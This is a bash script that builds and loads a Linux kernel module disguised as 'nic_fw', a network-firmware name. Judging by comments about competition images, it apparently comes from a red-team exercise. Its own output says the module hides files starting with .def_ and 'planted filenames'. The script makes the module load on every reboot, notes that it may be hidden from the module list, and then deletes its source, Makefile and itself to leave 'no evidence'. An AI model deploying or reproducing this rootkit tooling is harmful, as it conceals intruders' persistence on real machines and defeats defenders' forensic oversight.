#!/usr/bin/env bash
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

KVER="$(uname -r)"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KDIR="/lib/modules/${KVER}/build"

install_headers() {
    if [[ -d "$KDIR" ]]; then
        return 0
    fi
    echo "[*] Kernel headers not found — installing..."
    if command -v apt-get &>/dev/null; then
        # Disable cdrom source that blocks installs on DVD-provisioned machines.
        sed -i 's|^deb cdrom:|#deb cdrom:|g' /etc/apt/sources.list 2>/dev/null || true

        # Ensure standard Debian network repos are present (main, updates,
        # backports, security).  Competition images often only have cdrom.
        local codename
        codename=$(. /etc/os-release 2>/dev/null && printf '%s' "${VERSION_CODENAME:-bookworm}")
        local src_file="/etc/apt/sources.list.d/debian-rt-main.list"
        if ! grep -rqE "deb.debian.org/debian[[:space:]]+${codename}[[:space:]]+main" \
                /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null; then
            echo "[*] Adding Debian ${codename} repos..."
            cat > "${src_file}" <<EOF
deb http://deb.debian.org/debian ${codename} main
deb http://deb.debian.org/debian ${codename}-updates main
deb http://deb.debian.org/debian ${codename}-backports main
deb http://security.debian.org/debian-security ${codename}-security main
EOF
        fi
        # -o Acquire::Check-Valid-Until=false tolerates competition VMs where
        # the system clock lags the repo release timestamps by hours.
        DEBIAN_FRONTEND=noninteractive \
            apt-get -o Acquire::Check-Valid-Until=false update -q 2>/dev/null || true

        # Try exact running-kernel headers from standard repos first.
        if ! DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
                "linux-headers-${KVER}" build-essential 2>/dev/null; then
            # The exact kernel version may have been superseded and removed from
            # live repos.  Fall back to snapshot.debian.org which keeps every
            # historical .deb.
            # The /binary/<pkg>/ HTML page lists archive snapshot links, not .deb
            # files directly.  Use the machine-readable API instead:
            #   /mr/binary/<pkg>/<version>/binfiles  → JSON with SHA-1 hash
            #   /file/<hash>                         → direct file download
            echo "[*] Not in live repos — trying snapshot.debian.org (mr API)..."
            local dl pkg_ver hash tmp_deb
            dl=$(command -v wget || command -v curl || true)
            # Debian embeds the package version in uname -v, e.g. "Debian 6.1.148-1"
            pkg_ver=$(uname -v 2>/dev/null | grep -oP 'Debian \K[0-9][^) ]+' || true)
            if [[ -n "$dl" && -n "$pkg_ver" ]]; then
                # linux-headers-<KVER> (arch-specific shim) depends on
                # linux-headers-<ABI>-common (= exact version) for the actual
                # header files.  Both must come from snapshot; kbuild and
                # compiler-gcc packages have >= constraints and can be pulled
                # from live repos via apt-get install -f afterward.
                local kabi common_pkg
                kabi="${KVER%-amd64}"   # e.g. 6.1.0-39
                common_pkg="linux-headers-${kabi}-common"

                snap_fetch() {
                    local pkg="$1" h t
                    local url="https://snapshot.debian.org/mr/binary/${pkg}/${pkg_ver}/binfiles"
                    if [[ "$dl" == *wget ]]; then
                        h=$(wget -qO- "$url" 2>/dev/null | grep -oP '"hash"\s*:\s*"\K[0-9a-f]+' | head -1 || true)
                    else
                        h=$(curl -s "$url" 2>/dev/null | grep -oP '"hash"\s*:\s*"\K[0-9a-f]+' | head -1 || true)
                    fi
                    if [[ -n "$h" ]]; then
                        t=$(mktemp /tmp/lhdr-XXXXXX.deb)
                        if [[ "$dl" == *wget ]]; then
                            wget -q "https://snapshot.debian.org/file/${h}" -O "$t" 2>/dev/null || true
                        else
                            curl -s "https://snapshot.debian.org/file/${h}" -o "$t" 2>/dev/null || true
                        fi
                        DEBIAN_FRONTEND=noninteractive dpkg -i "$t" 2>/dev/null || true
                        rm -f "$t"
                    else
                        echo "[!]   snapshot: no hash for ${pkg}=${pkg_ver}"
                    fi
                }

                snap_fetch "$common_pkg"
                snap_fetch "linux-headers-${KVER}"
                # Pull kbuild and compiler-gcc from live repos (>= constraint,
                # bookworm-security's current kernel satisfies it).
                DEBIAN_FRONTEND=noninteractive apt-get install -f -y -q 2>/dev/null || true
            else
                echo "[!]   snapshot: need wget/curl and Debian pkg version (dl=${dl:-none}, pkg_ver=${pkg_ver:-empty})"
            fi
            # build-essential may still need installing even if headers came from snapshot
            DEBIAN_FRONTEND=noninteractive apt-get install -y -q build-essential 2>/dev/null || true
        fi
    elif command -v dnf &>/dev/null; then
        # Try exact running-kernel version first; repo may have rolled forward,
        # so fall back to unversioned kernel-devel (latest available).
        # elfutils-libelf-devel is required for kernel module builds on Rocky 9+.
        dnf install -y "kernel-devel-${KVER}" gcc make elfutils-libelf-devel 2>/dev/null || \
            dnf install -y kernel-devel gcc make elfutils-libelf-devel
    elif command -v yum &>/dev/null; then
        yum install -y "kernel-devel-${KVER}" gcc make 2>/dev/null || \
            yum install -y kernel-devel gcc make
    else
        echo "[!] Unknown package manager — cannot install kernel headers"
        exit 1
    fi
    if [[ ! -d "$KDIR" ]]; then
        echo "[!] ${KDIR} still missing after install"
        echo "[!]   Running kernel : ${KVER}"
        echo "[!]   Package linux-headers-${KVER} may not exist in any configured repo"
        echo "[!]   Skipping LKM — continuing without file-hiding module"
        return 1
    fi
    echo "[+] Kernel headers ready"
}

case "${1:-deploy}" in
  deploy)
    install_headers

    # Ensure build tools are present even when headers were already installed
    if ! command -v make &>/dev/null; then
        echo "[*] make not found — installing build tools..."
        if command -v apt-get &>/dev/null; then
            DEBIAN_FRONTEND=noninteractive apt-get install -y -q build-essential 2>/dev/null || true
        elif command -v dnf &>/dev/null; then
            dnf install -y gcc make 2>/dev/null || true
        elif command -v yum &>/dev/null; then
            yum install -y gcc make 2>/dev/null || true
        fi
    fi

    echo "[*] Building module for kernel ${KVER}..."
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    make -C "$DIR" KVER="$KVER"

    # Update persistent copy BEFORE loading — reboot gets the new version even if insmod fails
    EXTRA_DIR="/lib/modules/${KVER}/extra"
    mkdir -p "$EXTRA_DIR"
    cp "${DIR}/nic_fw.ko" "${EXTRA_DIR}/nic_fw.ko"
    depmod -a 2>/dev/null || true
    echo "nic_fw" > /etc/modules-load.d/net-fw.conf

    # Unload any existing version first; fails silently if hidden from module list
    rmmod nic_fw 2>/dev/null || true

    echo "[*] Loading module..."
    if insmod "${DIR}/nic_fw.ko"; then
        echo "[+] lkm/load: module loaded"
    else
        echo "[!] lkm/load: insmod failed — module may already be running"
        echo "[!]   Persistent copy updated: ${EXTRA_DIR}/nic_fw.ko"
        echo "[!]   Reboot to activate the updated module"
    fi
    echo "[+]   Hides: files starting with .def_ and planted filenames"
    echo "[+]   Auto-load on reboot: /etc/modules-load.d/net-fw.conf"

    # Wipe source and build artifacts — no evidence of what was compiled
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    rm -f "${DIR}/nic_fw.c" "${DIR}/Makefile"
    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
    ;;
  cleanup)
    rmmod nic_fw 2>/dev/null || echo "[!] rmmod failed — may need: rmmod nic_fw manually"
    rm -f "/lib/modules/${KVER}/extra/nic_fw.ko"
    rm -f /etc/modules-load.d/net-fw.conf
    depmod -a 2>/dev/null || true
    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
    echo "[-] lkm/load: module unloaded"
    ;;
  *) echo "Usage: $0 [deploy|cleanup]"; exit 1 ;;
esac
